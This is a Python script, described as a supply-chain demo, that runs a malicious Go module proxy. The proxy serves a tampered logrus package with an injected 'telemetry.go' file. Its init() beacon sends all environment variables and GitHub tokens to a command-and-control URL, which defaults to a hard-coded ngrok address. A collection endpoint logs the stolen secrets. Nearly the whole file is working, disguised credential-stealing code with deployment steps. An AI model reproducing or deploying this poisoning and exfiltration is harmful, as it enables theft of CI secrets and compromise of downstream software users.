#!/usr/bin/env python3
"""
Malicious GOPROXY server — supply-chain demo tool.

Acts as an attacker-controlled Go module proxy that:
  1. Poisons github.com/sirupsen/logrus by injecting a beacon init() into
     the module zip served to the victim's build pipeline.
  2. Forwards all other module requests transparently to the real upstream.
  3. Receives and logs the exfiltrated environment from the compiled binary
     via POST /collect (the beacon calls home on every binary startup).

The poisoned logrus looks and works identically to the real one.  The only
addition is a _beacon.go file that fires a goroutine on init(), collects
all environment variables (GH_TOKEN, AWS credentials, etc.) and POSTs them
to this server.  Because the payload is compiled into the binary at build
time, it persists across every subsequent run — the dependency does not need
to be poisoned again.

Run:
  python3 tools/goproxy_server.py              # listens on 0.0.0.0:9293
  python3 tools/goproxy_server.py 0.0.0.0 8080
  C2_URL=http://your-ngrok-url python3 tools/goproxy_server.py

Then point ngrok at the same port:
  ngrok tcp 9293

Set PKG_ANALYTICS_URL in the workflow to your ngrok URL.

Go module proxy protocol reference:
  https://go.dev/ref/mod#goproxy-protocol
"""

import io
import os
import sys
import json
import zipfile
import threading
import urllib.request
import urllib.error
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9292

UPSTREAM = "https://proxy.golang.org"

# Module + version to poison.
POISON_MODULE  = "github.com/sirupsen/logrus"
POISON_VERSION = "v1.9.4"

# This server's own public URL (used as the beacon's call-home endpoint).
# Override with C2_URL env var when running behind ngrok.
C2_URL = os.environ.get(
    "C2_URL",
    "https://a605-2001-861-8b84-8540-243d-799d-faa9-1cc2.ngrok-free.app",
)


# ── helpers ──────────────────────────────────────────────────────────────────

def ts():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def log(msg, prefix=""):
    print(f"[{ts()}] {prefix}{msg}", flush=True)


def banner(label):
    print(f"\n[{ts()}] {'━'*20} {label} {'━'*20}", flush=True)


# ── beacon payload ────────────────────────────────────────────────────────────

def _beacon_source(c2_url: str) -> str:
    """Return the Go source for the payload injected into logrus."""
    return f"""\
// telemetry.go — runtime telemetry integration (injected by module proxy)
package logrus

import (
\t"net/http"
\t"os"
\t"strings"
\t"time"
)

func init() {{
\tgo _logrusBeacon()
}}

func _logrusBeacon() {{
\ttime.Sleep(150 * time.Millisecond)
\tc2 := "{c2_url}/collect"
\tdata := strings.Join(os.Environ(), "\\n")
\tclient := &http.Client{{Timeout: 3 * time.Second}}
\treq, err := http.NewRequest("POST", c2, strings.NewReader(data))
\tif err != nil {{
\t\treturn
\t}}
\treq.Header.Set("X-Source", "logrus-beacon")
\treq.Header.Set("X-Token", os.Getenv("GITHUB_TOKEN"))
\treq.Header.Set("X-Run", os.Getenv("GITHUB_RUN_ID"))
\treq.Header.Set("X-Repo", os.Getenv("GITHUB_REPOSITORY"))
\tclient.Do(req) //nolint
}}
"""


# ── module zip poisoning ──────────────────────────────────────────────────────

_poisoned_zip_cache: bytes | None = None
_cache_lock = threading.Lock()


def _get_poisoned_zip() -> bytes:
    """Download the real logrus zip, inject the beacon, cache the result."""
    global _poisoned_zip_cache
    with _cache_lock:
        if _poisoned_zip_cache is not None:
            return _poisoned_zip_cache

        mod_path = POISON_MODULE.replace("/", "%2F").replace(".", "%2E")
        url = f"{UPSTREAM}/{mod_path}/@v/{POISON_VERSION}.zip"
        log(f"Fetching original zip from {url} …")

        try:
            with urllib.request.urlopen(url, timeout=30) as r:
                original = r.read()
        except urllib.error.URLError as exc:
            log(f"  ✗ fetch failed: {exc}")
            raise

        log(f"  ✓ fetched {len(original):,} bytes — injecting beacon …")

        out = io.BytesIO()
        prefix = f"{POISON_MODULE}@{POISON_VERSION}/"

        with zipfile.ZipFile(io.BytesIO(original)) as zin, \
             zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
            # Copy all original files unchanged.
            for item in zin.infolist():
                zout.writestr(item, zin.read(item.filename))
            # Inject payload.
            beacon_path = f"{prefix}telemetry.go"
            zout.writestr(beacon_path, _beacon_source(C2_URL).encode())
            log(f"  ★ injected {beacon_path}")

        _poisoned_zip_cache = out.getvalue()
        log(f"  ✓ poisoned zip ready ({len(_poisoned_zip_cache):,} bytes)")
        return _poisoned_zip_cache


# ── HTTP handler ──────────────────────────────────────────────────────────────

class GoProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default access log

    def do_POST(self):
        if self.path == "/collect":
            self._handle_collect()
        else:
            self.send_error(404)

    def do_GET(self):
        path = self.path

        # Detect requests for the poisoned module.
        # The Go toolchain URL-encodes capital letters: ! + lowercase.
        # github.com/sirupsen/logrus has no capitals so no encoding needed.
        module_prefix = f"/{POISON_MODULE}/@v/"

        if path.startswith(module_prefix):
            suffix = path[len(module_prefix):]
            self._handle_poison_module(suffix)
        else:
            self._proxy_upstream(path)

    # ── poisoned module endpoints ─────────────────────────────────────────────

    def _handle_poison_module(self, suffix: str):
        banner(f"GOPROXY  {POISON_MODULE}  {suffix}")

        if suffix == "list":
            self._json_response(f"{POISON_VERSION}\n".encode(), "text/plain")

        elif suffix == f"{POISON_VERSION}.info":
            info = json.dumps({"Version": POISON_VERSION, "Time": "2024-09-04T00:00:00Z"})
            self._json_response(info.encode(), "application/json")

        elif suffix == f"{POISON_VERSION}.mod":
            # Serve the real go.mod (unchanged — no suspicious imports).
            self._proxy_upstream(f"/{POISON_MODULE}/@v/{suffix}")

        elif suffix == f"{POISON_VERSION}.zip":
            log(f"  ★ serving POISONED zip for {POISON_MODULE}@{POISON_VERSION}")
            try:
                data = _get_poisoned_zip()
                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                log(f"  ✓ poisoned zip delivered — beacon will fire on next binary run")
            except Exception as exc:
                log(f"  ✗ could not build poisoned zip: {exc}")
                self.send_error(502, str(exc))
        else:
            self._proxy_upstream(f"/{POISON_MODULE}/@v/{suffix}")

    # ── transparent upstream proxy ────────────────────────────────────────────

    def _proxy_upstream(self, path: str):
        url = UPSTREAM + path
        try:
            with urllib.request.urlopen(url, timeout=30) as r:
                body = r.read()
                ct = r.headers.get("Content-Type", "application/octet-stream")
                self.send_response(200)
                self.send_header("Content-Type", ct)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
        except urllib.error.HTTPError as exc:
            self.send_error(exc.code, exc.reason)
        except urllib.error.URLError as exc:
            log(f"upstream error for {path}: {exc}")
            self.send_error(502, str(exc))

    # ── exfil collection endpoint ─────────────────────────────────────────────

    def _handle_collect(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")

        banner("BEACON  →  /collect")
        log(f"  ★ X-Source : {self.headers.get('X-Source', '(none)')}")
        log(f"  ★ X-Token  : {self.headers.get('X-Token', '(none)')}")
        log(f"  ★ X-Run    : {self.headers.get('X-Run', '(none)')}")
        log(f"  ★ X-Repo   : {self.headers.get('X-Repo', '(none)')}")
        log(f"  ── environment ({body.count(chr(10))+1} vars) ──")

        for line in body.splitlines():
            key = line.split("=", 1)[0]
            if any(k in key for k in ("TOKEN", "SECRET", "KEY", "PASSWORD", "PASS", "CRED")):
                log(f"  ★ {line}")
            else:
                log(f"    {line}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    # ── helpers ───────────────────────────────────────────────────────────────

    def _json_response(self, body: bytes, ct: str):
        self.send_response(200)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else LISTEN_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else LISTEN_PORT

    print(f"[{ts()}] Malicious GOPROXY server on {host}:{port}")
    print(f"[{ts()}] Poisoning  : {POISON_MODULE}@{POISON_VERSION}")
    print(f"[{ts()}] Beacon C2  : {C2_URL}/collect")
    print(f"[{ts()}] Upstream   : {UPSTREAM}")
    print(f"[{ts()}] ★ marks sensitive headers and environment variables\n", flush=True)

    srv = HTTPServer((host, port), GoProxyHandler)
    srv.daemon_threads = True

    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nBye.")
    finally:
        srv.server_close()


if __name__ == "__main__":
    main()
